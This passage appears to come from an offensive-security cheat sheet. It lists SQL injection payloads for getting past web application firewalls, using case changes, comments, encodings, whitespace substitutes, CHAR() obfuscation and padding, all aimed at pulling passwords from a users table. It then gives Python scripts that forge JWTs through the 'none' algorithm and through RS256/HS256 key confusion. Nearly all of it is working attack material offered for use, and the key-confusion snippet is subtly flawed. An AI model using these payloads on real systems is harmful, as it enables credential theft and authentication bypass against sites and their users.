🎭 BYPASS TECHNIQUE 1: CASE MANIPULATION

**Basic payload (blocked):**
```sql
' UNION SELECT password FROM users--
```

**Case variation:**
```sql
' UnIoN SeLeCt password FrOm users--
' uNiOn sElEcT password fRoM users--
```

═══════════════════════════════════════

🎭 BYPASS TECHNIQUE 2: COMMENT INJECTION

**Inline comments:**
```sql
' UNION/**/SELECT/**/password/**/FROM/**/users--
' UN/*comment*/ION SE/**/LECT password FR/**/OM users--
' /*!50000UNION*/ /*!50000SELECT*/ password /*!50000FROM*/ users--
```

**MySQL version comments:**
```sql
' /*!UNION*/ /*!SELECT*/ password /*!FROM*/ users--
```

═══════════════════════════════════════

🎭 BYPASS TECHNIQUE 3: ENCODING

**URL encoding:**
```sql
%27%20UNION%20SELECT%20password%20FROM%20users--
%2527%2520UNION%2520SELECT (double encoding)
```

**Hex encoding:**
```sql
' UNION SELECT 0x70617373776f7264 FROM users--
```

**Unicode encoding:**
```sql
\u0027 UNION SELECT password FROM users--
```

═══════════════════════════════════════

🎭 BYPASS TECHNIQUE 4: ALTERNATIVE SYNTAX

**Use alternative operators:**
```sql
' UNION SELECT password FROM users WHERE '1'='1
' UNION SELECT password FROM users WHERE 1 LIKE 1--
' UNION SELECT password FROM users WHERE 1 BETWEEN 0 AND 2--
```

**Bypass space filtering:**
```sql
'UNION(SELECT(password)FROM(users))--
'UNION%0ASELECT%0Apassword%0AFROM%0Ausers--  (newline)
'UNION%09SELECT%09password%09FROM%09users--  (tab)
'UNION%0DSELECT%0Dpassword%0DFROM%0Dusers--  (carriage return)
```

═══════════════════════════════════════

🎭 BYPASS TECHNIQUE 5: FUNCTION OBFUSCATION

**Replace keywords with functions:**
```sql
' UNION SELECT CHAR(112,97,115,115,119,111,114,100) FROM users--
' UNION SELECT CONCAT(CHAR(112),CHAR(97),CHAR(115),CHAR(115)) FROM users--
```

**Scientific notation:**
```sql
' UNION SELECT password FROM users WHERE id=1e0--  (1e0 = 1)
```

═══════════════════════════════════════

🎭 BYPASS TECHNIQUE 6: BUFFER OVERFLOW

**Overflow WAF with long payload:**
```sql
' UNION SELECT password,'AAAAA...[10,000 A's]...AAAAA' FROM users--
```

WAF may give up parsing after certain length!

### JWT Exploitation
```python
# JWT None Algorithm Attack
import jwt

# Original token
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

# Decode without verification
decoded = jwt.decode(token, options={"verify_signature": False})

# Modify claims
decoded['role'] = 'admin'
decoded['user_id'] = 1

# Re-encode with 'none' algorithm
forged_token = jwt.encode(decoded, '', algorithm='none')

# Send in Authorization header
# Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0...
```

```python
# JWT Key Confusion Attack
# Server uses RS256 but we trick it to use HS256 with public key

from jwt import encode
import requests

# Get public key from jwks endpoint
public_key = requests.get('https://target.com/.well-known/jwks.json').json()

# Create token signed with public key as secret (HS256)
payload = {'user': 'admin', 'role': 'admin'}
token = encode(payload, public_key, algorithm='HS256')
```
